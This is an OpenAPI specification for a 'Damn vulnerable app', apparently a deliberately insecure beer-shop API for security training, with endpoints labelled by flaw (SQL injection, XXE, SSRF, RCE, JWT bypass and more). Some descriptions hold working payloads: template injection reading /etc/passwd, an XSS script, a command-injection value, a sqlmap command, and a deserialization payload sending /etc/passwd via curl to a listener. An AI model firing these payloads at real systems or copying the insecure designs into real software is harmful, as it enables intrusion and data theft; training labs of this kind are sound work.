{"openapi":"3.0.0","info":{"title":"Damn vulnerable app","description":"Add your description","license":{"name":"MIT","url":""},"termsOfService":"","version":"1.0.0"},"servers":[],"security":[{"BearerAuth":[]}],"components":{"securitySchemes":{"BearerAuth":{"type":"http","scheme":"bearer"}},"schemas":{"Beer":{"description":"A Beer type","required":["name","price"],"type":"object","properties":{"name":{"description":"Name of the beer","type":"string"},"price":{"description":"The price","type":"number"},"picture":{"description":"The picture id","type":"string"}}},"User":{"description":"A User type","required":["email","password"],"type":"object","properties":{"name":{"description":"Name of the user","type":"string"},"email":{"description":"The email of the username","type":"string"},"password":{"description":"User Password -> encrypt to md5","type":"string"},"role":{"description":"User Role default admin (admin,user,blocked)","type":"string"},"address":{"description":"User Address","type":"string"},"profile_pic":{"description":"User profile pic","type":"string"}}},"BeerPicDTO":{"description":"Beer Pic DTO","type":"object","properties":{"file":{"description":"image file","type":"string","format":"binary"},"description":{"description":"file description (optional)","type":"string"}}},"BeerDTO":{"description":"Beer DTO for xml","type":"object","properties":{"file":{"description":"xml file","type":"string","format":"binary"}}},"LoginUserDTO":{"description":"LoginUserDTO for login","required":["email","password"],"type":"object","properties":{"email":{"description":"email","type":"string"},"password":{"description":"password","type":"string"}}}}},"paths":{"/v1/admin/new-beer/":{"post":{"deprecated":false,"summary":"use to create a new beer in the system","security":[],"responses":{"200":{"description":"respone with the beer created","content":{"application/json":{"schema":{"type":"object"}}}}},"parameters":[],"tags":["admin"],"requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/Beer"}}},"description":"Beer","required":true}}},"/v1/admin/upload-pic/":{"post":{"deprecated":false,"summary":"Image upload for admins","security":[],"responses":{"200":{"description":"respone with the image created","content":{"application/json":{"schema":{"type":"object"}}}}},"parameters":[],"tags":["admin"],"requestBody":{"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/BeerPicDTO"}}},"description":"image","required":true}}},"/v1/admin/new-beer-xml/":{"post":{"deprecated":false,"summary":"use to create a new beer in the system using xml parsing (XXE - XML External Entity)","security":[],"responses":{"200":{"description":"respone with the beer created","content":{"application/json":{"schema":{"type":"object"}}}}},"parameters":[],"tags":["admin"],"requestBody":{"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/BeerDTO"}}},"description":"beer info","required":true}}},"/":{"get":{"deprecated":false,"summary":"Front End Entry Page (SSTI - Server Side Template Injection)(Reflected XXS - Cross Site Scripting)","description":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}\n| localhost:5000/?message=<script>alert(0)</script>","security":[],"responses":{},"parameters":[{"name":"message","in":"query","description":"a message to present to the user","required":false,"deprecated":false,"schema":{"type":"string"}}],"tags":["frontend"]}},"/register":{"get":{"deprecated":false,"summary":"","security":[],"responses":{},"parameters":[{"name":"message","in":"query","description":"a message to present to the user","required":false,"deprecated":false,"schema":{"type":"string"}},{"name":"email","in":"query","description":"email body parameter","required":true,"deprecated":false,"schema":{"type":"string"}},{"name":"password","in":"query","description":"password body parameter","required":true,"deprecated":false,"schema":{"type":"string"}},{"name":"name","in":"query","description":"name body parameter","required":true,"deprecated":false,"schema":{"type":"string"}},{"name":"address","in":"query","description":"address body parameter","required":true,"deprecated":false,"schema":{"type":"string"}}],"tags":["frontend"]}},"/login":{"get":{"deprecated":false,"summary":"","security":[],"responses":{},"parameters":[{"name":"message","in":"query","description":"a message to present to the user","required":false,"deprecated":false,"schema":{"type":"string"}},{"name":"email","in":"query","description":"email body parameter","required":true,"deprecated":false,"schema":{"type":"string"}},{"name":"password","in":"query","description":"password body parameter","required":true,"deprecated":false,"schema":{"type":"string"}}],"tags":["frontend"]}},"/profile":{"get":{"deprecated":false,"summary":"","security":[],"responses":{},"parameters":[{"name":"message","in":"query","description":"a message to present to the user","required":false,"deprecated":false,"schema":{"type":"string"}},{"name":"id","in":"query","description":"Id number of the profile holder","required":true,"deprecated":false,"schema":{"type":"number"}}],"tags":["frontend"]}},"/beer":{"get":{"deprecated":false,"summary":"","security":[],"responses":{},"parameters":[{"name":"id","in":"query","description":"Id number of the beer","required":true,"deprecated":false,"schema":{"type":"number"}},{"name":"user","in":"query","description":"User id number of user viewing the page","required":true,"deprecated":false,"schema":{"type":"number"}}],"tags":["frontend"]}},"/v1/order":{"get":{"deprecated":false,"summary":"Use to list all available beer(Excessive Data Exposure)(PII Exposure/Oversharing)","security":[],"responses":{"200":{"description":"success response","content":{"application/json":{"schema":{"type":"array","items":{"$ref":"#/components/schemas/Beer"}}}}}},"parameters":[],"tags":["beer"]}},"/v1/beer-pic/":{"get":{"deprecated":false,"summary":"Get a picture of a beer (Path Traversal)","security":[],"responses":{},"parameters":[{"name":"picture","in":"query","description":"picture identifier","required":true,"deprecated":false,"schema":{"type":"string"}}],"tags":["beer"]}},"/v1/search/{filter}/{query}":{"get":{"deprecated":false,"summary":"Search for a specific beer (SQL Injection)","description":"sqlmap -u 'http://localhost:5000/search/id/2*'","security":[],"responses":{"200":{"description":"success response","content":{"application/json":{"schema":{"type":"array","items":{"$ref":"#/components/schemas/Beer"}}}}}},"parameters":[{"name":"query","in":"path","description":"the query to search for","required":false,"deprecated":false,"schema":{"type":"string"}},{"name":"filter","in":"path","description":"the column","required":false,"deprecated":false,"schema":{"type":"string"}}],"tags":["beer"]}},"/v1/status/{brand}":{"get":{"deprecated":false,"summary":"Check if brand website is available through curl (RCE - Remote Code Execution)","description":"command execution - brand=\"bud | whoami\"","security":[],"responses":{},"parameters":[{"name":"brand","in":"path","description":"the beer brand you want to test","required":true,"deprecated":false,"schema":{"type":"string"}}],"tags":["system"]}},"/v1/redirect/":{"get":{"deprecated":false,"summary":"Redirect the user the beer brand website (Insecure redirect)","security":[],"responses":{},"parameters":[{"name":"url","in":"query","description":"the beer brand you want to redirect to","required":true,"deprecated":false,"schema":{"type":"string"}}],"tags":["system"]}},"/v1/init/":{"post":{"deprecated":false,"summary":"Initalize beers from object (Insecure Object Deserialization)","description":"{\"rce\":\"_$$ND_FUNC$$_function ()\n{require('child_process').exec(\n'/bin/sh -c \\\"cat /etc/passwd | tr \\'\\n\\' \\' \\' | curl -d @- localhost:4444\\\"',\nfunction(error, stdout, stderr)\n{console.log(stdout) }\n);} () \"}\n\n\nnetcat -l 4444","security":[],"responses":{},"parameters":[],"tags":["system"],"requestBody":{"content":{"application/json":{"schema":{"type":"object"}}},"description":"the beer brand you want to test","required":true}}},"/v1/test/":{"get":{"deprecated":false,"summary":"Perform a get request on another url in the system (SSRF - Server Side Request Forgery)","security":[],"responses":{},"parameters":[{"name":"url","in":"query","description":"the beer brand you want to redirect to","required":true,"deprecated":false,"schema":{"type":"string"}}],"tags":["system"]}},"/v1/admin/users/":{"get":{"deprecated":false,"summary":"List all users (Unverified JWT Manipulation)(Authorization Bypass)","security":[{"BearerAuth":[]}],"responses":{"200":{"description":"success response","content":{"application/json":{"schema":{"type":"array","items":{"$ref":"#/components/schemas/User"}}}}}},"parameters":[],"tags":["admin"]}},"/v1/user/{user_id}":{"get":{"deprecated":false,"summary":"Get information of a specific user","security":[],"responses":{"200":{"description":"success response","content":{"application/json":{"schema":{"type":"array","items":{"$ref":"#/components/schemas/User"}}}}}},"parameters":[{"name":"user_id","in":"path","description":"user id to get information","required":true,"deprecated":false,"schema":{"type":"integer"}}],"tags":["user"]},"delete":{"deprecated":false,"summary":"Delete a specific user (Broken Function Level Authentication)","security":[],"responses":{"200":{"description":"success response","content":{"application/json":{"schema":{"type":"array","items":{"$ref":"#/components/schemas/User"}}}}}},"parameters":[{"name":"user_id","in":"path","description":"user id to delete (Broken Function Level)","required":true,"deprecated":false,"schema":{"type":"integer"}}],"tags":["user"]},"put":{"deprecated":false,"summary":"update user - (horizontal privesc)(mass assignment/BOLA)","security":[],"responses":{"200":{"description":"success","content":{"application/json":{"schema":{"type":"string"}}}},"401":{"description":"wrong password","content":{"application/json":{"schema":{"type":"string"}}}},"404":{"description":"user not found","content":{"application/json":{"schema":{"type":"string"}}}}},"parameters":[{"name":"user_id","in":"path","description":"","required":true,"deprecated":false,"schema":{"type":"integer"}}],"tags":["user"],"requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/User"}}},"description":"update credentials","required":true}}},"/v1/user/":{"post":{"deprecated":false,"summary":"create a new user (Weak Password)(ReDos - Regular Expression Denial of Service)","description":"\"email\": \"aaaaaaaaa@aaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{\",","security":[],"responses":{"200":{"description":"user response","content":{"application/json":{"schema":{"type":"object"}}}}},"parameters":[],"tags":["user"],"requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/User"}}},"description":"User","required":true}}},"/v1/love/{beer_id}":{"get":{"deprecated":false,"summary":"make a user love a beer(CSRF - Client Side Request Forgery GET)","security":[],"responses":{"200":{"description":"user response","content":{"application/json":{"schema":{"type":"object"}}}}},"parameters":[{"name":"beer_id","in":"path","description":"Beer Id","required":true,"deprecated":false,"schema":{"type":"integer"}},{"name":"id","in":"query","description":"User ID","required":false,"deprecated":false,"schema":{"type":"integer"}},{"name":"front","in":"query","description":"is it a frontend redirect ?","required":false,"deprecated":false,"schema":{"type":"boolean"}}],"tags":["user"]},"post":{"deprecated":false,"summary":"make a user love a beer(CSRF - Client Side Request Forgery POST)","security":[],"responses":{"200":{"description":"user response","content":{"application/json":{"schema":{"type":"object"}}}}},"parameters":[{"name":"beer_id","in":"path","description":"Beer Id","required":true,"deprecated":false,"schema":{"type":"integer"}},{"name":"id","in":"query","description":"User ID","required":false,"deprecated":false,"schema":{"type":"integer"}},{"name":"front","in":"query","description":"is it a frontend redirect ?","required":false,"deprecated":false,"schema":{"type":"boolean"}}],"tags":["user"]}},"/v1/user/token":{"post":{"deprecated":false,"summary":"login endpoint to get jwt token - (Insecure JWT Implementation)","security":[],"responses":{"200":{"description":"success","content":{"application/json":{"schema":{"type":"string"}}}},"401":{"description":"wrong password","content":{"application/json":{"schema":{"type":"string"}}}},"404":{"description":"user not found","content":{"application/json":{"schema":{"type":"string"}}}}},"parameters":[],"tags":["user"],"requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/LoginUserDTO"}}},"description":"user login credentials","required":true}}},"/v1/user/login":{"post":{"deprecated":false,"summary":"login page - (Session fixation)(user enumeration)(insecure password/no hashing)","security":[],"responses":{"200":{"description":"success","content":{"application/json":{"schema":{"type":"string"}}}},"401":{"description":"wrong password","content":{"application/json":{"schema":{"type":"string"}}}},"404":{"description":"user not found","content":{"application/json":{"schema":{"type":"string"}}}}},"parameters":[],"tags":["user"],"requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/LoginUserDTO"}}},"description":"user login credentials","required":true}}},"/v1/admin/promote/{user_id}":{"put":{"deprecated":false,"summary":"promote to admin - (vertical privesc)","security":[],"responses":{"200":{"description":"success","content":{"application/json":{"schema":{"type":"string"}}}},"401":{"description":"wrong password","content":{"application/json":{"schema":{"type":"string"}}}},"404":{"description":"user not found","content":{"application/json":{"schema":{"type":"string"}}}}},"parameters":[{"name":"user_id","in":"path","description":"","required":true,"deprecated":false,"schema":{"type":"integer"}}],"tags":["admin"]}},"/v1/user/{user_id}/validate-otp":{"post":{"deprecated":false,"summary":"Validate One Time Password - (Broken Authorization/2FA)(Auth Credentials in URL)(lack of rate limiting)","security":[],"responses":{"200":{"description":"success","content":{"application/json":{"schema":{"type":"string"}}}},"401":{"description":"invalid token","content":{"application/json":{"schema":{"type":"string"}}}}},"parameters":[{"name":"user_id","in":"path","description":"","required":true,"deprecated":false,"schema":{"type":"integer"}},{"name":"seed","in":"query","description":"otp seed","required":false,"deprecated":false,"schema":{"type":"string"}},{"name":"token","in":"query","description":"token to be supplied by the user and validated against the seed","required":true,"deprecated":false,"schema":{"type":"string"}}],"tags":["user"]}}},"tags":[{"name":"admin","description":""},{"name":"beer","description":""},{"name":"frontend","description":""},{"name":"system","description":""},{"name":"user","description":""}]}